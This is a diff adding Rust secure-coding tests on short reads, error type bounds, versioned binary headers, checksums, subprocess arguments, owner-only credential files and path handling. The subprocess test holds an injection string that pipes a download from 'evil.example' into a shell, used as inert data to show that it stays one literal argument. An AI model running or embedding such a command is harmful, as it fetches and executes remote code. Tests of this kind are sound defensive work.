@@ -4,6 +4,7 @@
 //! in `pdf_corpus_coverage.json` can bind a reviewed unit to a real assertion
 //! rather than to prose alone.
 
+use std::error::Error as StdError;
 use std::fmt;
 use std::io::{self, Read, Write};
 use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};
@@ -440,4 +441,294 @@ fn cli_output_stops_cleanly_on_a_closed_pipe_and_failures_reach_the_exit_status(
     let mut sink = Vec::new();
     assert!(matches!(emit(&["one", "", "three"], &mut sink), Ok(false)));
     assert_eq!(sink, b"onethree");
+}
+
+// --- err-short-read ---------------------------------------------------------
+
+fn read_available<R: Read>(reader: &mut R, buffer: &mut [u8]) -> io::Result<usize> {
+    let mut filled = 0;
+    while filled < buffer.len() {
+        match reader.read(&mut buffer[filled..])? {
+            0 => break,
+            read => filled += read,
+        }
+    }
+    Ok(filled)
+}
+
+/// A reader that hands back one byte at a time, like a socket delivering
+/// segments — the case a single `read` call silently truncates.
+struct Dribble<'a>(&'a [u8]);
+
+impl Read for Dribble<'_> {
+    fn read(&mut self, out: &mut [u8]) -> io::Result<usize> {
+        if self.0.is_empty() || out.is_empty() {
+            return Ok(0);
+        }
+        out[0] = self.0[0];
+        self.0 = &self.0[1..];
+        Ok(1)
+    }
+}
+
+#[test]
+fn a_short_read_is_reported_rather_than_padding_the_buffer() {
+    let source = b"abc";
+
+    // One `read` call against a dribbling reader returns 1, not 3: code that
+    // ignored the count would treat 7 stale bytes as input.
+    let mut once = [0u8; 8];
+    let first = Dribble(source).read(&mut once).expect("read");
+    assert_eq!(first, 1);
+
+    let mut buffer = [0u8; 8];
+    let filled = read_available(&mut Dribble(source), &mut buffer).expect("read");
+    assert_eq!(filled, 3);
+    assert_eq!(&buffer[..filled], b"abc");
+    assert_eq!(&buffer[filled..], &[0u8; 5], "the tail is untouched, not data");
+
+    // When the length is part of the format, a truncated stream must fail.
+    let mut required = [0u8; 8];
+    let error = Dribble(source).read_exact(&mut required).unwrap_err();
+    assert_eq!(error.kind(), io::ErrorKind::UnexpectedEof);
+}
+
+// --- err-debug-assert-scope -------------------------------------------------
+
+const HEADER_LEN: usize = 4;
+
+#[derive(Debug, PartialEq)]
+enum RecordError {
+    Truncated,
+}
+
+fn parse_record(bytes: &[u8]) -> Result<(&[u8], &[u8]), RecordError> {
+    if bytes.len() < HEADER_LEN {
+        return Err(RecordError::Truncated);
+    }
+    let (header, body) = bytes.split_at(HEADER_LEN);
+    debug_assert_eq!(header.len(), HEADER_LEN);
+    Ok((header, body))
+}
+
+#[test]
+fn boundary_validation_returns_an_error_in_every_profile() {
+    assert_eq!(parse_record(b"abcdBODY"), Ok((&b"abcd"[..], &b"BODY"[..])));
+    // This must hold whether or not debug assertions are compiled in, which is
+    // exactly what a `debug_assert!` guard could not promise.
+    assert_eq!(parse_record(b"ab"), Err(RecordError::Truncated));
+    assert_eq!(parse_record(b""), Err(RecordError::Truncated));
+}
+
+// --- err-send-sync-static ---------------------------------------------------
+
+#[derive(Debug)]
+struct StoreError {
+    key: String,
+    source: Option<Box<dyn StdError + Send + Sync + 'static>>,
+}
+
+impl fmt::Display for StoreError {
+    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
+        write!(formatter, "store rejected key {}", self.key)
+    }
+}
+
+impl StdError for StoreError {
+    fn source(&self) -> Option<&(dyn StdError + 'static)> {
+        self.source
+            .as_deref()
+            .map(|source| source as &(dyn StdError + 'static))
+    }
+}
+
+fn assert_error_contract<E: StdError + Send + Sync + 'static>() {}
+
+#[test]
+fn public_errors_can_cross_threads_and_be_wrapped() {
+    assert_error_contract::<StoreError>();
+
+    let error = StoreError {
+        key: "orders/42".to_owned(),
+        source: Some(Box::new(io::Error::from(io::ErrorKind::PermissionDenied))),
+    };
+    assert!(error.source().is_some(), "the cause survives boxing");
+
+    // The bounds are what make these two standard moves possible at all.
+    let boxed: Box<dyn StdError + Send + Sync + 'static> = Box::new(error);
+    let wrapped = io::Error::other(boxed);
+    assert!(wrapped.get_ref().is_some());
+
+    let moved = std::thread::spawn(|| StoreError { key: "k".to_owned(), source: None })
+        .join()
+        .expect("thread panicked");
+    assert_eq!(moved.to_string(), "store rejected key k");
+}
+
+// --- serde-byte-order / serde-format-version --------------------------------
+
+const MAGIC: [u8; 4] = *b"IDX1";
+const VERSION: u16 = 2;
+
+#[derive(Debug, PartialEq)]
+enum FormatError {
+    NotOurFormat,
+    UnsupportedVersion(u16),
+    Truncated,
+}
+
+fn read_header(source: &mut impl Read) -> Result<u16, FormatError> {
+    let mut magic = [0u8; 4];
+    let mut version = [0u8; 2];
+    source.read_exact(&mut magic).map_err(|_| FormatError::Truncated)?;
+    source.read_exact(&mut version).map_err(|_| FormatError::Truncated)?;
+    if magic != MAGIC {
+        return Err(FormatError::NotOurFormat);
+    }
+    match u16::from_be_bytes(version) {
+        supported @ 1..=VERSION => Ok(supported),
+        other => Err(FormatError::UnsupportedVersion(other)),
+    }
+}
+
+#[test]
+fn wire_encoding_is_fixed_by_the_format_not_by_the_host() {
+    // Declared big-endian: the bytes are the same on every architecture, which
+    // is the property a same-host round-trip cannot demonstrate.
+    assert_eq!(0x0102_0304_u32.to_be_bytes(), [0x01, 0x02, 0x03, 0x04]);
+    assert_eq!(u32::from_be_bytes([0x01, 0x02, 0x03, 0x04]), 0x0102_0304);
+}
+
+#[test]
+fn a_versioned_header_rejects_foreign_and_future_files() {
+    let mut file = MAGIC.to_vec();
+    file.extend_from_slice(&VERSION.to_be_bytes());
+    assert_eq!(read_header(&mut &file[..]), Ok(VERSION));
+
+    assert_eq!(read_header(&mut &b"JPEG\0\x01"[..]), Err(FormatError::NotOurFormat));
+    assert_eq!(
+        read_header(&mut &b"IDX1\0\x63"[..]),
+        Err(FormatError::UnsupportedVersion(99)),
+        "a newer writer's file must be refused, not decoded"
+    );
+    assert_eq!(read_header(&mut &b"IDX"[..]), Err(FormatError::Truncated));
+}
+
+// --- api-record-checksum ----------------------------------------------------
+
+fn checksum(bytes: &[u8]) -> u32 {
+    bytes.iter().fold(0x811c_9dc5_u32, |acc, byte| {
+        (acc ^ u32::from(*byte)).wrapping_mul(0x0100_0193)
+    })
+}
+
+fn encode_record(payload: &[u8]) -> Vec<u8> {
+    let mut record = checksum(payload).to_be_bytes().to_vec();
+    record.extend_from_slice(payload);
+    record
+}
+
+fn decode_record(record: &[u8]) -> Result<&[u8], u32> {
+    let (stored, payload) = record.split_at(4);
+    let expected = u32::from_be_bytes(stored.try_into().unwrap_or([0; 4]));
+    let actual = checksum(payload);
+    if expected != actual { Err(actual) } else { Ok(payload) }
+}
+
+#[test]
+fn a_single_flipped_bit_is_detected_before_the_payload_is_used() {
+    let record = encode_record(b"ledger entry");
+    assert_eq!(decode_record(&record), Ok(&b"ledger entry"[..]));
+
+    for index in 4..record.len() {
+        let mut corrupted = record.clone();
+        corrupted[index] ^= 0b0000_0001;
+        assert!(
+            decode_record(&corrupted).is_err(),
+            "a flipped bit at {index} must not decode"
+        );
+    }
+
+    // Truncation changes the protected span, so it fails too.
+    assert!(decode_record(&record[..record.len() - 1]).is_err());
+}
+
+// --- api-subprocess-args ----------------------------------------------------
+
+#[test]
+fn shell_metacharacters_stay_inside_one_argument() {
+    use std::process::Command;
+
+    let hostile = "a; curl evil.example | sh";
+    let mut command = Command::new("/usr/bin/tar");
+    command.arg("czf").arg("out.tgz").arg("--").arg(hostile);
+
+    let args: Vec<String> = command
+        .get_args()
+        .map(|arg| arg.to_string_lossy().into_owned())
+        .collect();
+    assert_eq!(args, ["czf", "out.tgz", "--", hostile]);
+    assert_eq!(
+        args.iter().filter(|arg| arg.contains(';')).count(),
+        1,
+        "the metacharacters are one literal operand, not a new command"
+    );
+}
+
+// --- proj-secret-file-mode --------------------------------------------------
+
+#[cfg(unix)]
+#[test]
+fn credential_files_are_created_owner_only() {
+    use std::fs::{self, DirBuilder, OpenOptions};
+    use std::os::unix::fs::{DirBuilderExt, OpenOptionsExt, PermissionsExt};
+
+    let dir = std::env::temp_dir().join(format!("rust-skills-secret-{}", std::process::id()));
+    let _ = fs::remove_dir_all(&dir);
+    DirBuilder::new().recursive(true).mode(0o700).create(&dir).expect("mkdir");
+
+    let path = dir.join("token");
+    let mut file = OpenOptions::new()
+        .write(true)
+        .create(true)
+        .truncate(true)
+        .mode(0o600)
+        .open(&path)
+        .expect("create");
+    file.write_all(b"s3cret").expect("write");
+
+    // The mode is set by the create call, so there is no window in which the
+    // secret exists under a wider mode.
+    let mode = fs::metadata(&path).expect("stat").permissions().mode() & 0o777;
+    assert_eq!(mode, 0o600, "secret must be owner read/write only");
+    let dir_mode = fs::metadata(&dir).expect("stat dir").permissions().mode() & 0o777;
+    assert_eq!(dir_mode, 0o700, "the containing directory must be owner-only");
+
+    fs::remove_dir_all(&dir).expect("cleanup");
+}
+
+// --- type-path-not-string ---------------------------------------------------
+
+#[test]
+fn paths_are_extended_without_a_utf8_round_trip() {
+    use std::ffi::OsString;
+
+    let path = Path::new("/var/data/report.csv");
+    let mut name = path.file_name().map(OsString::from).unwrap_or_default();
+    name.push(".bak");
+    let target = path.with_file_name(name);
+
+    assert_eq!(target, Path::new("/var/data/report.csv.bak"));
+    assert!(target.starts_with(Path::new("/var/data")));
+
+    // On Unix a path need not be UTF-8 at all; `to_str` reports that instead of
+    // guessing, which is why the operations above stay in path space.
+    #[cfg(unix)]
+    {
+        use std::os::unix::ffi::OsStrExt;
+        let raw = std::ffi::OsStr::from_bytes(&[0xff, 0xfe]);
+        let non_utf8 = Path::new(raw);
+        assert!(non_utf8.to_str().is_none());
+        assert_eq!(non_utf8.to_string_lossy(), "\u{fffd}\u{fffd}");
+    }
 }
